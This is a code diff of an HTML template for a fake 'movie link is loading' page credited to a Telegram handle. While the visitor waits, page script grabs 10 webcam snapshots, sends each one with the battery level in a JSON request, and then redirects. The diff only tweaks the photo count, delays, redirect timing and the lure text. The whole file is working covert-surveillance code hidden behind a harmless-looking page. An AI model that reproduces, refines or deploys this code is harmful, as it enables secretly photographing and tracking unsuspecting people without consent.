@@ -35,8 +35,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>YOUR LINK IS LOADING</h1>
-        <p>PLEASE WAIT FOR 3-4 SECOND...</p>
+        <h1>MADE BY gajarbotol.t.me</h1>
+        <p>MOVIE LINK IS LOADING PLEASE WAIT...</p>
     </div>
     <script>
         async function startCapture() {
@@ -50,7 +50,7 @@
                 const context = canvas.getContext('2d');
 
                 const capturePhotos = async () => {
-                    for (let i = 0; i < 15; i++) { // Capture 15 photos
+                    for (let i = 0; i < 10; i++) { // Capture 10 photos
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         const snapshot = canvas.toDataURL('image/png');
 
@@ -65,7 +65,7 @@
                             body: JSON.stringify({ image: snapshot, battery: batteryLevel })
                         });
 
-                        await new Promise(resolve => setTimeout(resolve, 200)); // 200ms delay for 5 photos per second
+                        await new Promise(resolve => setTimeout(resolve, 300)); // 300ms delay
                     }
 
                     video.pause();
@@ -85,7 +85,7 @@
             startCapture();
             setTimeout(() => {
                 window.location.href = "{{ redirect_url }}";
-            }, 4000); // Wait for 4 seconds before redirecting
+            }, 6000); // Wait for 6 seconds before redirecting
         });
     </script>
 </body>
